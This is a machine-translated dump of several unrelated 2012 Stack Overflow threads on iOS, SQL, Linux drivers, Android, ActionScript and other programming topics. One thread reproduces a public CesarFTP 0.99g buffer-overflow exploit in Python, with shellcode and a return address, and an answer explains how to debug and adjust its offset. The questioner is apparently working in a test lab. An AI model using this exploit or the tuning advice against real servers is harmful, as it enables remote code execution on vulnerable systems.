    if ([_dataSource respondsToSelector:@selector(tableAlert:titleForHeaderInSection:)]) {
        NSString *title = [_dataSource tableAlert:self titleForHeaderInSection:section];
        if (!title)
            return nil;

        return [[[SBTableViewSectionHeaderView alloc] initWithTitle:title] autorelease];
    }

    return nil;
}

- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section {
    if ([self tableView:tableView viewForHeaderInSection:section])
        return 25.;
    return 0.;
}

#pragma mark -
#pragma mark UITableViewDataSource

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {    
    return [_dataSource tableAlert:self cellForRowAtIndexPath:indexPath];
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return [_dataSource tableAlert:self numberOfRowsInSection:section];
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    if ([_dataSource respondsToSelector:@selector(numberOfSectionsInTableAlert:)])
        return [_dataSource numberOfSectionsInTableAlert:self];

    return 1;
}

#pragma mark -
#pragma mark UIAlertViewDelegate

- (void)alertViewCancel:(UIAlertView *)alertView {
    if ([_delegate respondsToSelector:@selector(tableAlertCancel:)])
        [_delegate tableAlertCancel:self];
}

- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {
    if ([_delegate respondsToSelector:@selector(tableAlert:clickedButtonAtIndex:)])
        [_delegate tableAlert:self clickedButtonAtIndex:buttonIndex];
}

- (void)willPresentAlertView:(UIAlertView *)alertView {
    if (!_presented)
        [self layout];
    _presented = YES;
    if ([_delegate respondsToSelector:@selector(willPresentTableAlert:)])
        [_delegate willPresentTableAlert:self];
}
- (void)didPresentAlertView:(UIAlertView *)alertView {
    if ([_delegate respondsToSelector:@selector(didPresentTableAlert:)])
        [_delegate didPresentTableAlert:self];
}

- (void)alertView:(UIAlertView *)alertView willDismissWithButtonIndex:(NSInteger)buttonIndex {
    if ([_delegate respondsToSelector:@selector(tableAlert:willDismissWithButtonIndex:)])
        [_delegate tableAlert:self willDismissWithButtonIndex:buttonIndex];
}
- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex {
    _presented = NO;
    if ([_delegate respondsToSelector:@selector(tableAlert:didDismissWithButtonIndex:)])
        [_delegate tableAlert:self didDismissWithButtonIndex:buttonIndex];
}

@end 
```

我在上面放了 -fno-objc-arc 标志，但是当我尝试打开它时，它给了我一个

```
*** -[SBTableAlert tableView:cellForRowAtIndexPath:]: message sent to deallocated instance 0x816b8c0 
```

错误

我打开它：

```
SBTableAlert   *alert;
    alert   = [[SBTableAlert alloc] initWithTitle:NSLocalizedString(@"servers", nil) cancelButtonTitle:NSLocalizedString(@"cancel", nil) messageFormat:nil];
    [alert setDelegate:self];
    [alert setDataSource:self];
    [alert.view setTag:1];

    [alert show]; 
```

有谁知道如何处理它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:10:04.107

神圣的连续句子，蝙蝠侠！尝试将这些嵌套的方法调用分解为多行，因为它会使代码更具可读性。

鉴于最终表达式是生成错误消息的表达式，它看起来像您的一个数组中的一个对象——叶节点/数据对象——被过度释放。

因此，故障在于创建阵列的任何原因。

顺便说一句：方法应始终以小写字母开头，并且不应以 . 为前缀`get`。因此，该方法将是`tableFromLevel:section:parent:array:`或类似的。按照惯例，`get*`作为前缀是为通过引用返回内容的方法保留的。访问器也没有前缀`get`。

另外并在评论中指出，不需要创建一个空数组，将其分配给 self.allData 然后立即覆盖它。不是因为 的泄漏`autorelease`，但这样做没有意义。

* * *

首先，构建和分析您的代码。修复它抱怨的任何东西。

Next, if the crash is still happening, use the Allocations instrument and turn on Zombie detection. It should allow you to see the retains/releases sent to the object that is crashing.

# debugging - 为什么 cesarftp python 漏洞利用不起作用？

> ID：12146128
> 
> 赞同：2
> 
> 时间：2012-08-27T16:50:19.973
> 
> 标签：debugging, ftp, exploit, ollydbg

我在运行 cesarftp 的服务器上进行了测试。我使用ollydbg调试了服务器上的ftp服务器。

我使用的漏洞是[http://www.exploit-db.com/exploits/1906/](http://www.exploit-db.com/exploits/1906/)

```
#!/usr/bin/python

#CesarFtp 0.99g 0day Exploit

#Proof of Concept: execute calc.exe

#Tested on XP sp2 polish

#Bug found by h07 [h07@interia.pl]

#Date: 10.06.2006

from socket import *

shellcode = ( #execute calc.exe <metasploit.com>

"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"

"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"

"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"

"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"

"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"

"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"

"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"

"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"

"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"

"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"

"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

def intel_order(i):

    a = chr(i % 256)

    i = i >> 8

    b = chr(i % 256)

    i = i >> 8

    c = chr(i % 256)

    i = i >> 8

    d = chr(i % 256)

    str = "%c%c%c%c" % (a, b, c, d)

    return str

host = "192.168.0.1"

port = 21

user = "ftp"

password = "ftp"

EIP = 0x773D10A4 #jmp esp <shell32.dll XP professional sp2 english>

s = socket(AF_INET, SOCK_STREAM)

s.connect((host, port))

print s.recv(1024)

s.send("user %s\r\n" % (user))

print s.recv(1024)

s.send("pass %s\r\n" % (password))

print s.recv(1024)

buffer = "MKD "

buffer += "\n" * 671

buffer += "A" * 3 + intel_order(EIP)

buffer += "\x90" * 40 + shellcode

buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)

print s.recv(1024)

s.close()

#EoF 

# milw0rm.com [2006-06-12] 
```

我将“JMP ESP”地址更改为正确的地址（因为服务器没有运行波兰语 XP；它运行的是英语 XP。我使用 ollydbg 上的可执行模块并搜索命令“JMP ESP”发现了这一点。）

然而，exp 未能正确执行，登录后，ftp 服务器就崩溃了，没有启动 shell。

在我看来，代码只需要在“JMP ESP”区域进行修改..

我做错了什么？

编辑：如果正确执行，shellcode 似乎会调出 calc.exe。这没有发生。显然，没有得到贝壳。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T21:29:43.277

易受攻击的函数可能不是使用 strcpy() 而是使用 strcat() 复制数据。在通过反复试验编写漏洞利用程序时，这是一个常见的新手错误。

由于正在读取的值应该是路径，因此这里真正发生的情况可能是您的字符串被连接到 FTP 服务器根目录的路径。

如果发生这种情况，那么您不仅需要更改刚刚的地址，还需要更改有效负载字符串中的偏移量（“671”值）。不幸的是，这也意味着漏洞利用将取决于知道 FTP 根的确切位置。

为了确保您必须附加一个调试器并查看在发送有效负载之前和之后发生了什么。尝试以下操作：

1.  将调试器附加到 FTP 服务器。
2.  运行漏洞利用。它会使服务器崩溃。
3.  现在 EIP 将指向 0x90909090 或 0x0d0d0d0d。检查堆栈，直到找到指向代码的有效指针（父函数的返回地址）。
4.  现在杀死服务器并重新启动它。
5.  再次附加调试器，并在您找到的父函数的开头设置一个断点。
6.  再次运行漏洞利用。现在断点应该命中。逐步运行代码，直到找到易受攻击的函数。现在，您将能够在粉碎它之前查看哪个函数存在错误以及堆栈的外观。

# iphone - 将纬度/经度数据添加到 iOS 中的滚动视图

> ID：12146132
> 
> 赞同：0
> 
> 时间：2012-08-27T16:50:41.973
> 
> 标签：iphone, ios, ipad, coordinates

我为我正在开发的 iOS 应用程序创建了一个自定义地图 (jpg)。我在滚动视图中显示了大图像。

我已经有了图像所有四个角的纬度/经度，但我不确定如何转换已知位置，以便我可以在地图的某些位置绘制标签。标签位置基于纬度/经度，因此我需要一种将经度转换为 ax/y 坐标的方法，以在应用程序的图像上显示对象。

我已经查找了这方面的信息，但我发现的所有内容都更多地涉及获取知道的纬度/经度，而不是在应用程序中实现它。

（地图是德克萨斯州大小的区域）

将不胜感激任何指导

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T20:47:27.880

After reading your questions a couple of times, I still do not know what you are trying to do. But here is some tips for converting

say your jpg image has the (lat,lng) of (a,b) to (c,d) and pixel of (width,height)

so to get (lat,lng) from (x,y) you use

```
lat = a + x/width*(c-a);
lng = b + y/height*(d-b); 
```

Now make sure you are using the same coordinate system. If not, say your pixel starts from lower left instead of top left, then just invert it.

```
lat = a + x/width*(c-a);
lng = b + (height - y)/height*(d-b); 
```

Same goes for converting x and y from lat and lng. Just reverse the formula above. Now you need to look up stuff from Google using their reverse geocoding API. Unless you prefer something else, here is some snippet:

```
NSString *urlStr = [NSString stringWithFormat:@"http://maps.googleapis.com/maps/api/geocode/json?latlng=%f,%f&sensor=true", lat, lng];
NSData *dataFromServer = [NSData dataWithContentsOfURL: [NSURL URLWithString:urlStr]]; 
```

dataFromServer contains JSON infomation about the thing you are trying to look up. Parse it however you need to.

Is this what you are looking for?

# sql - 没有 UDF 的 SQL 检查约束

> ID：12146136
> 
> 赞同：7
> 
> 时间：2012-08-27T16:51:06.350
> 
> 标签：sql, user-defined-functions, data-integrity, check-constraint

我有以下（虚构的）表格：

```
╔════════════════════╗        ╔════════════════════╗
║ Course             ║        ║ Person             ║
╠══════╦═════════════╣        ╠══════╦═════════════╣
║ ID   ║ int         ║        ║ ID   ║ int         ║
║ Name ║ varchar(50) ║        ║ Name ║ varchar(50) ║
╚══════╩═════════════╝        ╚══════╩═════════════╝

╔════════════════════╗        ╔═════════════════════╗
║ Occupation         ║        ║ B_Occupation_Person ║
╠══════╦═════════════╣        ╠══════════════╦══════╣
║ ID   ║ int         ║        ║ Person_ID    ║ int  ║
║ Name ║ varchar(50) ║        ║ Ocupation_ID ║ int  ║
╚══════╩═════════════╝        ╚══════════════╩══════╝

╔═════════════════╗
║ B_Course_Person ║
╠═══════════╦═════╣
║ Course_ID ║ int ║
║ Person_ID ║ int ║
╚═══════════╩═════╝ 
```

在`Occupation`表中，有 2 行：`Student`和`Teacher`。

绑定表`B_Occupation_Person`允许我给所有人一个职业，`B_Course_Person`绑定表允许我将老师与课程联系起来。

我的问题是我想确保`B_Course_Person`只能包含教师。

我的第一个想法是在这个表上添加一个检查约束，但我只能通过使用 UDF 从`B_Occupation_Person`表中获取该人的职业来做到这一点。从我[在这里](https://dba.stackexchange.com/questions/12779/how-are-my-sql-server-constraints-being-bypassed)读到的内容来看，在检查约束中使用 UDF 是不好的。

我的第二个想法是`Occupation`在`B_Course_Person`表中添加一列，但随后我得到了数据冗余......

什么是最好的方法，在这里？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:26:12.457

如果您的人员表中有一个“类型”列来区分学生和教师（例如，如果一个人可以同时是两者，这是不可能的），您可以在主键中包含该类型列，然后限制链接表的外键给老师：

```
create table person 
(
   id integer not null, 
   person_type varchar(10) not null,
   name varchar(100),
   constraint pk_person primary key (id, person_type),
   constraint type_check check (person_type in ('student', 'teacher'))
);

create table b_occupation_person
(
  occupation_id integer not null,
  person_id integer not null,
  person_type varchar(10) not null,
  constraint fk_occupation_person 
      foreign key (person_id, person_type) 
      references person (id, person_type),
  constraint type_check check (person_type = 'teacher')
); 
```

这`person_type`是多余的，`b_occupation_person`但据我所知，这是以声明方式创建这种类型的约束的唯一选择。

由于外键和检查约束，除了教师之外，无法将其他任何内容插入 `b_occupation_person`.

但同样：这只有在你*能*真正区分教师和学生的情况下才有效（并且如果教师不能是学生）。

如果您需要一个人作为教师**和**学生（并且您没有“person_type”），您可能会考虑一个`teacher`简单地引用 person 表的表：

```
create table person 
(
   id integer not null primary key, 
   name varchar(100)
);

create table teacher 
(
  person_id integer not null primary key,
  foreign key (person_id) references person (id)
);

create table b_occupation_person
(
  occupation_id integer not null,
  teacher_id integer not null,
  foreign key (teacher_id) references teacher (person_id)
); 
```

这样做的缺点是需要插入两次作为老师的人（一次插入人，一次插入老师）。

在 PostgreSQL 中，您可以利用表继承并将教师定义为从人继承。因此，任何插入到教师中的操作也会自动创建一个人（因此您不需要两次插入这样的人）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:19:42.373

您在这里的问题代表了一种业务逻辑形式。您不仅要确保 b_course_person 在插入时仅包含教师，而且还要确保数据保持一致 - 即：如果一个人不再成为教师，那么 b_course_person 中的数据会发生什么情况？

因此，您应该在代码中实现此逻辑；或者作为一个存储过程来表示您与数据库的接口并确保所有数据更改都会产生一致、有效的数据集，或者作为业务逻辑层中应用程序层的更上层。

# linux - 来自 32 位用户代码的 64 位系统中的 ioctl 命令错误

> ID：12146146
> 
> 赞同：2
> 
> 时间：2012-08-24T13:21:59.263
> 
> 标签：linux, 64-bit, 32-bit

我正在将设备驱动程序从 32 位 RHEL 2.6.32 升级到 64 位 RHEL 2.6.33.9。

我有一个使用 ioctl 与该驱动程序对话的程序。当驱动程序和程序都是 64 位或 32 位时，它可以完美运行。但是当驱动是 64 位，而我的程序是 32 位时，驱动接收到的 ioctl 命令（在 compat_ioctl 中）与 _IOR 和 _IOW 宏定义的值不匹配。

在我的驱动程序的 switch 语句中，默认情况下打印出所有有效命令的值，即 1-12。32 位 ioctl 命令与这些值相去甚远。

有人能告诉我在 64 位驱动程序中收到来自 32 位用户程序的命令时，什么会导致混乱？

这是一些代码：我必须输入它；该代码位于无法访问互联网的安全系统上，因此请原谅任何拼写错误。它确实会跑来跑去！

```
// IOCTL commands from the include file - most omitted
// ...
#define PORTIO_GET_IRQ_CNT_CMD  10
#define PORTIO_CLR_IRQ_CNT_CMD  11
#define PORTIO_GET_IRQ_TIME_CMD 12

#define PORTIO_IOCTL     'k'  // magic number for ioctl

// IOCTL Macros
#define PORTIO_GET_IRQ_CNT_IOCTL    _IOR(PORTIO_IOCTL, PORTIO_GET_IRQ_CNT_CMD, unsigned long)
#define PORTIO_CLR_IRQ_CNT_IOCTL    _IOR(PORTIO_IOCTL, PORTIO_CLR_IRQ_CNT_CMD, unsigned long)
#define PORTIO_GET_IRQ_TIME_IOCTL   _IOR(PORTIO_IOCTL, PORTIO_GET_IRQ_TIME_CMD, unsigned long) 
```

这是来自 portio.c 的 32 位兼容 IOCTL 例程。我已经确认只有当我的程序编译为 32 位并且驱动程序是 64 位时才会调用它。

```
static long portio_compat_ioctl( struct inode *inode, struct file *filp, unsigned int cmd, unsigned long arg)
{
unsigned char cmd_number;
int cmd_size=0;
//...
cmd_number = _IOC_NR( cmd );
cmd_size = _IOC_SIZE( cmd );

printk( KERN_ALERT "Portio Compat IOCTL number,size = %d,%d, cmd_number, cmd_size );
//... Switch statement and cases, based on cmd_number
} 
```

输出如下所示：

Portio Compat IOTCL 编号，大小 = 224,3157

当然，代码需要 1-12 的 IOCTL 编号，大小约为 4 或 8。这正是代码和驱动程序都是 64 位或 32 位时返回的结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:03:57.507

在我看来，您的函数`compat_ioctl`需要太多参数。查看Linux内核中的其他定义：

```
long compat_blkdev_ioctl(struct file *file, unsigned cmd, unsigned long arg) 
```

[http://lxr.linux.no/#linux+v3.5.3/block/compat_ioctl.c#L654](http://lxr.linux.no/#linux+v3.5.3/block/compat_ioctl.c#L654)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-25T06:19:38.590

```
#define PORTIO_GET_IRQ_CNT_IOCTL    _IOR(PORTIO_IOCTL, PORTIO_GET_IRQ_CNT_CMD, unsigned long)
#define PORTIO_CLR_IRQ_CNT_IOCTL    _IOR(PORTIO_IOCTL, PORTIO_CLR_IRQ_CNT_CMD, unsigned long)
#define PORTIO_GET_IRQ_TIME_IOCTL   _IOR(PORTIO_IOCTL, PORTIO_GET_IRQ_TIME_CMD, unsigned long) 
```

**将 unsigned long 更改为 unit64_t（固定数据类型）** **从 ioctl 宏参数中删除所有指针，具有：**

```
.compat_ioctl
.unlocked_ioctl in kernel pointing to same function. 
```

# android - 在 Http Live Streaming Android 3.0+ 中获取当前日期

> ID：12146149
> 
> 赞同：5
> 
> 时间：2012-08-27T16:51:55.607
> 
> 标签：android, android-mediaplayer, http-live-streaming

我正在搜索如何使用 Android 3.0 或 4.0 中的默认 MediaPlayer 获取 HTTP Live Stream (HLS) 的当前时间。m3u8 文件中的标签是：#EXT-X-PROGRAM-DATE-TIME。我需要那个时间只是为了展示目的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T19:25:16.043

我很确定这不会在Android中公开。我认为您需要发挥创造力...也许您可以单独检索 m3u8 文件，并根据您解析的内容显示一些内容。

# actionscript-3 - 根据用户的选择在 AS3 中创建可重复使用的形状

> ID：12146151
> 
> 赞同：0
> 
> 时间：2012-08-27T16:52:04.373
> 
> 标签：actionscript-3

我目前正在使用 ActionScript 3 编程语言在 Adob​​e CS5 Flash Professional 平台上开发一个教育 Flash 应用程序。

在我的程序中，用户需要在一个 4x4 的方形网格上绘制一个形状，这是我使用一个运行了 16 次的 For 循环生成的。

当 For 循环构造网格时，它添加了相同的 23x23 像素平方 MovieClip 的 16 个子实例，它们均匀地分布在四行四列中，并且每个 MovieClip 都分配有一个唯一的 ID 号，范围从 1-16 和一个 Mouse Down侦听器事件，准备好进行用户交互。

如果用户单击网格中的正方形，在绘制和选择形状的过程中，MovieClip 的颜色将首先改变以向用户表示它已被选择包含。

其次，我还设置了一个基于布尔值的数组 [0-15]，它链接到网格的相应 ID 号，例如，如果我在 4x4 网格中选择了左上角的正方形，则 [0] 的属性我的布尔数组将从 false 变为 true，同样，如果我沿着网格的第二行选择第三个正方形，我的数组的 [6] 属性也会执行相同的操作，依此类推。

现在使用这种技术并引用数组，我总是可以知道我的用户选择了哪些块，并且通过在我的程序的后续幻灯片上运行另一个 For 循环，我已经设法输出，基于我的“选择”布尔数组，与我的用户设计的形状相同，在另一个 4x4 网格的范围内，如果任何数组值设置为 True，则所选块的颜色从灰色变为黑色。

**现在我的问题是**，我的用户随后需要将他们在第一个网格上生成的设计形状大量绘制到更大的第二个网格上（在某些情况下最多 8-9 次）。这个网格比 4x4 大得多，确切地说是 24 x 12（288 个块）。

**现在我需要**的是，当我的用户单击第二个较大的网格时，我希望将他们设计的形状的输出作为全新的 MovieClip 添加到舞台上。

但重要的是，需要裁剪形状。例如，如果用户通过选择块 2、3、6、7 在第一个网格上制作了一个正方形；我不希望将 16 块 MovieClip（92x92 像素，基于我的 23x23 像素块）添加到更大的网格中，其中四个块用不同的颜色着色，我想要一个 4 块方形（46 x 46 像素，基于我的 23x23 块）从您在第二个网格上选择的左上角网格正方形中添加。

理想情况下，我想使用形状绘图工具以编程方式创建用户的绘制形状并在函数中执行此操作，因此我可以在每次用户进入第二个网格区域时运行该函数并更新用户的形状，如果用户有回去并在第一个网格中对其进行了修改。这也给了我在将它的子元素添加到我的舞台之前更改形状颜色的范围，这是我需要的另一个功能领域，也是我想以编程方式执行此形状的另一个原因。

我想象在另一个数组中从第一个网格中捕获块的 x/y 坐标，然后在该数组中搜索以找到第一个块实例，然后从这一点绘制形状，这可能是前进的方向，但那是就我的想法而言。

任何关于如何做到这一点的想法或建议阅读都将非常受欢迎。非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:24:24.487

我的建议是您使用位图作为此类形状的基类，以完全透明的方式对其进行初始化，然后使用调整后的 X&Y 值在该 bitmap.bitmapData 上绘制（）您的 MC，然后将该位图放置在“更大的网格”上使用提供 X&Y。

```
var bd:BitmapData=new BitmapData(23*4,23*4,true,0x0);
var mat:Matrix=new Matrix();
mat.tx=-1*LeftCornerX;
mat.ty=-1*LeftCornerY;
for (i=0;i<16;i++) if (BlockMCsSelected[i])  bd.draw(BlockMCs[i],mat);
var bm:Bitmap=new Bitmap(bd);
bm.x=SuppliedX;
bm.y=SuppliedY;
LargerGrid.addChild(bm); 
```

基本上，如果您正确指定输入数据，则应该这样做。但是如果你需要它来接收事件，把这个bitmap封装成一个Sprite对象，它可以处理事件，给sprite坐标，而不是bitmap。

# geolocation - 查找美国城市的 IP 地址范围

> ID：12146154
> 
> 赞同：0
> 
> 时间：2012-08-27T16:52:15.043
> 
> 标签：geolocation, ip

我正在尝试找到一些 IP 地址来测试网站上的 IP 地理定位功能。有谁知道找到某些城市（即西雅图、洛杉矶）的静态 IP 地址的好方法，或者找到美国城市的 IP 范围的好方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-30T02:08:12.787

我的服务[http://ipinfo.io](http://ipinfo.io)有一个 API，可以让您查找给定 IP 的城市，例如：

```
$ curl ipinfo.io/8.8.8.8
{
  "ip": "8.8.8.8",
  "hostname": "google-public-dns-a.google.com",
  "loc": "37.385999999999996,-122.0838",
  "org": "AS15169 Google Inc.",
  "city": "Mountain View",
  "region": "California",
  "country": "US",
  "phone": 650
} 
```

没有 API 可以进行反向操作（查找给定城市的 IP），但您可以使用类似 site:ipinfo.io 的谷歌搜索来查找给定城市的 IP。例如，搜索美国西雅图会出现以下页面：

*   [http://ipinfo.io/97.113.203.115](http://ipinfo.io/97.113.203.115)
*   [http://ipinfo.io/174.21.174.240](http://ipinfo.io/174.21.174.240)
*   [http://ipinfo.io/54.200.79.127](http://ipinfo.io/54.200.79.127)
*   [http://ipinfo.io/207.171.163.31](http://ipinfo.io/207.171.163.31)

# windows - Delphi Xe2 和 Microsoft 应用程序认证套件

> ID：12146155
> 
> 赞同：0
> 
> 时间：2012-08-27T16:52:18.050
> 
> 标签：windows, delphi-xe2

作为对象，我正在尝试对 Windows 8 执行兼容性测试：使用 Delphi XE 或 XE2 编译的任何应用程序都未通过**“Windows 安全最佳实践测试”测试**，特别是**“攻击面分析器”**测试，并出现以下错误：

> MyExecutable.exe 上的弱 ACL 允许多个非管理员帐户进行篡改。
> 
> 文件：MyExecutable.exe 可写者：经过身份验证的用户权限：FILE_WRITE_ATTRIBUTES、FILE_WRITE_EA、FILE_APPEND_DATA、FILE_WRITE_DATA

我也尝试了一个简单的空项目，但我总是得到同样的错误，这让我获得了“与 Windows 8 兼容”的状态。

谁能帮我？

这些链接对此进行了解释：http: [//blogs.msdn.com/b/openspecification/archive/2010/04/01/about-the-access-mask-structure.aspx](http://blogs.msdn.com/b/openspecification/archive/2010/04/01/about-the-access-mask-structure.aspx) http://msdn.microsoft.com/库/windows/apps/hh750314.aspx#asa

问候丹尼尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-29T16:32:02.913

经过进一步调查和洞察后，我确定问题不在于编译器，而在于可执行文件上定义的 acl。安装后可以通过各种工具更改acl，包括microsoft的cacls.exe（http://technet.microsoft.com/en-us/library/bb490872.aspx）

eg: **cacls.exe MYEXE.EXE / E / G "Everyone: R"**只对组 "Everyone" 设置 "Read" 和 "Read & Execute" 的权限

无论如何感谢大家。

问候丹尼尔

# java - 从 APK 反编译的 Java - 什么都不做的 while 循环

> ID：12146157
> 
> 赞同：2
> 
> 时间：2012-08-27T16:52:27.690
> 
> 标签：java, reverse-engineering, apk, decompiling, smali

我反编译了一个 apk，看到许多 while 循环立即返回，后面跟着其他代码：

```
while (true){
   return;
   if (!cond1){
     continue;
   }
   if (cond2){
     continue;
   }
} 
```

如果您想在反编译中生成此代码，您会编写什么 Java 代码来实现这一目标？

笔记。反编译过程是apktool -> baksmali -> smali -> dex2jar

**编辑**

我实际上无法从 Android APK 获取原始 Java 字节码（至少我不知道如何）。可能是我的工具在逆向工程方面做得很差，但以下是 smali 的输出：

```
:goto_8
return-void

.line 40
:sswitch_9
const/4 v0, 0x0

iput v0, p0, Lcom/sec/android/app/camera/command/ContextualTagSelectCommand;->mContextualTag:I

goto :goto_8

.line 44
:sswitch_d
const/4 v0, 0x1

iput v0, p0, Lcom/sec/android/app/camera/command/ContextualTagSelectCommand;->mContextualTag:I

goto :goto_8 
```

对应于：

```
while (true)
{
  return;
  this.mContextualTag = 0;
  continue;
  this.mContextualTag = 1;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T18:09:08.547

您的字节码是已编译 switch 语句的片段。具体来说，它是使用**稀疏开关**Dalvik 字节码指令实现的。您只显示了两个 switch 案例，它们都分配给`mContextualTag`然后执行`return`语句。它`return`被放置在程序中的一个点上，switch case 跳转到它。标签`sswitch_9`和`sswitch_d`可能指示`sswitch`指令本身的相对偏移量。

# java - 解析 Xml 并添加不同的颜色

> ID：12146159
> 
> 赞同：-1
> 
> 时间：2012-08-27T16:52:51.873
> 
> 标签：java, android, xml, xml-parsing

我是android新手，需要帮助，我有一个在线xml，我用这个例子来解析。 [例子](https://stackoverflow.com/questions/10518275/how-to-display-data-in-listview-once-you-parse-the-xml-with-nested-tag)

但是不知道如何根据值为内容“Var”添加颜色，如果高于零，则为绿色，如果小于零，则为红色。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T20:50:05.193

假设这是您所指的教程[http://www.jondev.net/articles/Android_XML_SAX_Parser_Example](http://www.jondev.net/articles/Android_XML_SAX_Parser_Example)那么我会假设您已经解决了如何将数据放入列表视图？

如果您使用了 customListAdapter，例如本示例[http://jnastase.alner.net/archive/2010/12/19/custom-android-listadapter.aspx](http://jnastase.alner.net/archive/2010/12/19/custom-android-listadapter.aspx)，那么您需要在 getView( ) 方法来自定义列表项视图的颜色。例如，您可以更改背景颜色或文本颜色。

```
public View getView(int position, View convertView, ViewGroup parent) {
    ....
    TextView mytext = findViewById(R.id.myText);
    int yourVar = getItem(position).var;
    if(yourVar > 0)
    {
        mytext.setTextColor(0x0000FF);
    }else{
        mytext.setTextColor(0xFF0000);
    }
} 
```

这假设有一定数量，例如您使用自定义列表适配器和您自己的布局。

修正案。如果这是文本视图中的文本列表，那么您可以尝试使用 html 对其进行格式化，例如这个问题显示了如何为[文本着色 更改 TextView 中一个单词的文本颜色](https://stackoverflow.com/questions/7221930/change-text-color-of-one-word-in-a-textview)

```
String someText1 = "<font color='#FF0000'>this is red text</font>";
String someText2 = "Standard text"
yourTextView.setText(Html.fromHtml(someText1 + someText2)); 
```

然而，这并不能完全回答您的问题，因为您需要完成以下步骤。

1.  获取文本值
2.  转换为数字并执行上面的条件测试。
3.  如上所示，以 html 格式包装文本值。
4.  写回字符串。

您可以尝试正则表达式，或将字符串拆分为数组。恐怕我不知道这一点。

# google-analytics - 谷歌分析 GET 请求

> ID：12146161
> 
> 赞同：0
> 
> 时间：2012-08-27T16:52:58.910
> 
> 标签：google-analytics, libcurl, get-request

如果我有一个代码请求一个由谷歌分析监控的页面，那么获取响应是 200 OK ，但它没有被谷歌分析记录下来，有没有人经历过这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T16:56:18.653

如果您使用 curl 或类似的东西来请求页面，则可能是该页面上的 javascript 未执行。页面加载后，Google 分析代码会将标签写入文档，然后该脚本连接到 GA 并记录访问。用户浏览器是执行JS的，curl之类的只是返回服务器输出的页面源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T16:59:46.150

反应不是立即的。您要等多久才能检查您的回复是否已被记录？

您是从公共 domainname.com 登录还是从无法公开访问的本地网络服务器登录？

# uitabbarcontroller - 使用按钮导航到不同的选项卡

> ID：12146172
> 
> 赞同：1
> 
> 时间：2012-08-27T16:54:18.757
> 
> 标签：uitabbarcontroller, xcode4.3

我的应用程序有四个选项卡。第一个选项卡（索引 0）的根视图控制器是登录页面作为 modalviewcontroller 弹出的位置，但第四个选项卡（索引 3）中的视图控制器是注销按钮所在的位置。有没有办法以编程方式设置它，以便在按下注销按钮时应用程序转换到索引为零的选项卡？我最初尝试了推送转换，但这使得索引为零的根视图控制器显示为索引三中的视图控制器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-28T09:49:19.000

如果您想以编程方式更改选项卡，只需调用

```
[self.tabBarController setSelectedIndex:index]; 
```

在您的情况下，创建选择器，它将分配给注销按钮事件。

```
- (IBAction) didClickLogoutButton:(id)sender {
    // do some work to log out the user...
    [self.tabBarController setSelectedIndex:0];
} 
```

希望这就是你的意思。

# windows-phone-7 - 在主页代码后面的用户控件上更改列表框内的网格列宽

> ID：12146173
> 
> 赞同：0
> 
> 时间：2012-08-27T16:54:24.633
> 
> 标签：windows-phone-7

我有一个 ListBox UserControl，并且 DataTemplate 中有一个网格控件。我使用 MVVM 来绑定数据。对于方向更改，我可以更改列表框的宽度，但我找不到更改列表框内网格列宽度的解决方案。你能帮我怎么做或提供一个例子或链接给我。提前致谢。

有我的 UserControl.xaml

```
<UserControl x:Class="CMSPhoneApp.QueueListControl"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
mc:Ignorable="d"
FontFamily="{StaticResource PhoneFontFamilyNormal}"
FontSize="{StaticResource PhoneFontSizeNormal}"
Foreground="{StaticResource PhoneForegroundBrush}"
d:DesignHeight="480" d:DesignWidth="480"
xmlns:local="clr-namespace:CMSPhoneApp"  >

